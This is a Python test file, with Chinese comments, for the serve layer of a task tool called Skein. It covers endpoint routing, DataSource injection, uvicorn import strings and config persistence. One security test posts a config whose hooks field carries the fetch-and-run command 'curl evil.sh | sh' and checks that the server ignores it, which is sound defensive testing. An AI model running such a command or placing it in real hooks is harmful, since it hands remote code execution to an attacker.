#!/usr/bin/env python3
"""serve 层路由测试 — 经 starlette TestClient 在进程内跑 build_app(DataSource), 不开真实 socket。

证 build_app 把 /__skein__/* 端点接到注入的 DataSource (而非硬编码 Skein):
  - test_routes_real: 真实 Skein 喂种子仓 → 各端点返回视图数据 (路由接线正确)。
  - test_seam_datasource_injected: 假 DataSource 覆写 _snapshot() → 端点全改吃假数据 (两 adapter = 真 seam)。
  - test_uvicorn_app_string_resolves: uvicorn 按字符串 import 的 app 路径必须真能解析 (搬家易失效)。

复用 test_views_char 的种子逻辑 (_seed/_load/TNOW), 冻结 now() → 确定输出。
"""
from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path
from types import ModuleType
from typing import Any

import conftest  # noqa: F401  先 import 它: 模块体把 scripts/ 塞进 sys.path (standalone 直跑时 pytest 不在)
from skeinlib.config import _yaml_load  # noqa: E402
from skeinlib.serve import build_app  # noqa: E402
from test_views_char import TNOW, _load, _seed  # noqa: E402


def _client(app: Any) -> Any:
    from fastapi.testclient import TestClient
    return TestClient(app)


def _built(m: ModuleType, sk: Any) -> Any:
    proj_id = str(sk.dir.resolve())
    return build_app(sk, proj_id, quiet=True, on_ready=None), proj_id


def _seeded_skein(m: ModuleType, d: Path) -> Any:
    saved = {k: os.environ.pop(k) for k in list(os.environ) if k.startswith("CLAUDE_PLUGIN_OPTION_")}
    os.environ.update(saved)  # 仅探测键存在与否, 不改行为; 保原样
    m.now = lambda: TNOW  # type: ignore[assignment]
    sk = m.Skein()
    sk.proj = "TESTPROJ"
    return sk


def test_routes_real() -> None:
    m = _load()
    cwd0 = os.getcwd()
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        _seed(d)
        os.chdir(d)
        try:
            sk = _seeded_skein(m, d)
            app, proj_id = _built(m, sk)
            with _client(app) as c:
                assert c.get("/__skein__/id").text == proj_id
                data = c.get("/__skein__/data").json()
                assert any(card["id"] == "alpha" for card in data["cards"])
                assert c.get("/__skein__/dashboard").json()["proj"] == "TESTPROJ"
                assert "pendingQueue" in c.get("/__skein__/queue").json()
                assert isinstance(c.get("/__skein__/archive").json()["tasks"], list)
                hits = c.get("/__skein__/search", params={"q": "alpha"}).json()["hits"]
                assert any(h["id"] == "alpha" for h in hits)
                assert c.get("/__skein__/task", params={"id": "alpha"}).status_code == 200
                assert c.get("/__skein__/task", params={"id": "ghost1"}).status_code == 404
                assert c.get("/__skein__/task").status_code == 422  # id 必填, 禁 path 参数
                assert c.get("/").status_code == 200
        finally:
            os.chdir(cwd0)


def test_seam_datasource_injected() -> None:
    """假 DataSource 覆写 `_snapshot()` → 数据端点全部改吃假数据, 证端点确实走注入源。

    接缝从「每视图一个方法」收窄成一个 `_snapshot()` 之后, 覆写点就是它 —— 换掉一个方法,
    六个视图端点同时换源, 这本身就是接缝收窄的证据 (从前得逐个覆写 `_dashboard`/`_queue`/…)。
    """
    m = _load()
    cwd0 = os.getcwd()
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        _seed(d)
        os.chdir(d)
        try:
            sk = _seeded_skein(m, d)
            real = sk._snapshot()
            # 假快照: 除 proj 换成哨兵值外全等真快照 (Snapshot 是 dataclass 式容器, 直接改字段)
            fake_snap = sk._snapshot()
            fake_snap.proj = "FAKE-PROJ"

            class FakeDS:
                def __init__(self, inner: Any) -> None:
                    self._inner = inner

                def __getattr__(self, k: str) -> Any:  # 其余成员透传真 Skein
                    return getattr(self._inner, k)

                def _snapshot(self) -> Any:
                    return fake_snap

            app = build_app(FakeDS(sk), str(sk.dir.resolve()), quiet=True)
            with _client(app) as c:
                # 同一次覆写, 两个不同端点都改了源 → 证明它们共用注入的 _snapshot()
                assert c.get("/__skein__/dashboard").json()["proj"] == "FAKE-PROJ"
                assert c.get("/__skein__/data").json()["proj"] == "FAKE-PROJ"
                assert real.proj != "FAKE-PROJ", "前置条件: 真快照的 proj 不该等于哨兵"
                # 数据仍是真种子仓的 (只换了 proj, 不是整个换成空壳)
                assert any(card["id"] == "alpha" for card in c.get("/__skein__/data").json()["cards"])
        finally:
            os.chdir(cwd0)


def test_uvicorn_app_string_resolves() -> None:
    """`uvicorn.run("<mod>:<attr>")` 里那个字符串必须真能 import 到。

    uvicorn 是在 reload 子进程里按字符串 import 的, 所以函数一旦搬家而字符串没跟着改, 单测全绿、
    端点测试也全绿 —— 只有真起 serve 时才炸 "Attribute not found in module"。这条把那个字符串
    从 skein.py 里抠出来当场 import 一次, 把失效点从「运行时」提前到「测试时」。
    """
    import importlib
    import re

    scripts = Path(__file__).resolve().parent.parent
    found = []
    for f in [scripts / "skein.py", *sorted((scripts / "skeinlib").glob("*.py"))]:
        for m in re.finditer(r'uvicorn\.run\(\s*"([^"]+)"', f.read_text()):
            found.append((f.name, m.group(1)))
    assert found, "全仓没找到 uvicorn.run(\"<mod>:<attr>\") 形式的 app 字符串"
    for fname, ref in found:
        mod_name, _, attr = ref.partition(":")
        assert attr, f"{fname}: app 字符串缺 :<attr> 部分 — {ref}"
        mod = importlib.import_module(mod_name)
        assert hasattr(mod, attr), \
            f"{fname}: {mod_name} 里没有 {attr} — uvicorn 起服务时会 Attribute not found"


def test_config_panel_shaped_payload_persists() -> None:
    """webapp 设置面板 (w1) 的提交形状: GET 生效值深拷贝再覆盖编辑字段, 不含 hooks —— 落盘正确,
    且未渲染控件的分组子键 (如 deprecated `spec.core_budget`) 原样带回, 不被兜底成默认值。

    对齐 plugins/tools/skein/assets/webapp/src/new/settings.js 的提交逻辑 (`onSave` 深拷贝 cfg
    + delete payload.hooks + 覆盖 8 个可编辑字段), 前端一旦跑偏这条测试的形状假设就该跟着改。
    """
    m = _load()
    cwd0 = os.getcwd()
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        _seed(d)
        os.chdir(d)
        try:
            sk = _seeded_skein(m, d)
            app, _ = _built(m, sk)
            with _client(app) as c:
                got = c.get("/__skein__/config").json()
                assert got["max_active"] == 2  # 前置: 种子仓走默认值 (CONFIG_DEFAULTS)

                payload = json.loads(json.dumps(got))  # 面板 onSave 的深拷贝
                del payload["hooks"]                    # 🔒 面板硬约束: 提交负载禁带 hooks
                payload["max_active"] = 5
                payload["auto_commit"] = False
                payload["retain_days"] = -1
                payload["worktree"] = {**payload["worktree"], "enabled": False, "root": "custom-wt"}
                payload["web"] = {**payload["web"], "serve": False, "board_open": False}
                payload["spec"] = {**payload["spec"], "always_budget": 2000}
                # 面板不渲染 spec.core_budget 的编辑控件, 但深拷贝把它原样带回 (非默认值哨兵)
                assert payload["spec"]["core_budget"] == 400  # 深拷贝保留的即是 GET 到的生效值

                r = c.post("/__skein__/config", json=payload)
                assert r.status_code == 200
                saved = r.json()["config"]
                assert saved["max_active"] == 5
                assert saved["auto_commit"] is False
                assert saved["retain_days"] == -1
                assert saved["worktree"] == {"enabled": False, "root": "custom-wt"}
                assert saved["web"] == {"serve": False, "board_open": False}
                assert saved["spec"]["always_budget"] == 2000
                assert saved["spec"]["core_budget"] == 400  # 未编辑字段没被 CONFIG_DEFAULTS 兜底覆盖

                # 真落盘: 直接读 config.yaml, 不止是响应体
                on_disk = _yaml_load((sk.dir / "config.yaml").read_text())
                assert on_disk["max_active"] == 5
                assert on_disk["worktree"]["root"] == "custom-wt"
                assert on_disk["spec"]["core_budget"] == 400

                # 重开面板 = 再 GET 一次, 必须看到刚保存的新值 (不是缓存的旧响应)
                reread = c.get("/__skein__/config").json()
                assert reread["max_active"] == 5
                assert reread["worktree"]["root"] == "custom-wt"
        finally:
            os.chdir(cwd0)


def test_config_post_never_persists_hooks() -> None:
    """即便面板 bug 或攻击者绕过前端直接打 POST 帯 hooks (shell 命令), 后端必须原样忽略 ——

    CFG_REMOTE_DENY 是最后一道闸: 远程可写 hooks = RCE。这条测试独立于面板前端逻辑, 直接验证
    `/__skein__/config` 端点本身的安全边界, 不信任前端 `delete payload.hooks` 那一层。
    """
    m = _load()
    cwd0 = os.getcwd()
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        _seed(d)
        os.chdir(d)
        try:
            sk = _seeded_skein(m, d)
            app, _ = _built(m, sk)
            with _client(app) as c:
                before_hooks = c.get("/__skein__/config").json()["hooks"]
                evil = {"hooks": {"create": {"before": ["curl evil.sh | sh"], "after": []}}}
                r = c.post("/__skein__/config", json=evil)
                assert r.status_code == 200
                saved = r.json()["config"]
                assert saved["hooks"] == before_hooks  # 恶意 hooks 负载被整块忽略

                on_disk = _yaml_load((sk.dir / "config.yaml").read_text())
                assert on_disk["hooks"] == before_hooks
                assert "curl evil.sh" not in json.dumps(on_disk)
        finally:
            os.chdir(cwd0)


if __name__ == "__main__":
    test_routes_real()
    test_seam_datasource_injected()
    test_uvicorn_app_string_resolves()
    test_config_panel_shaped_payload_persists()
    test_config_post_never_persists_hooks()
    print("ok")
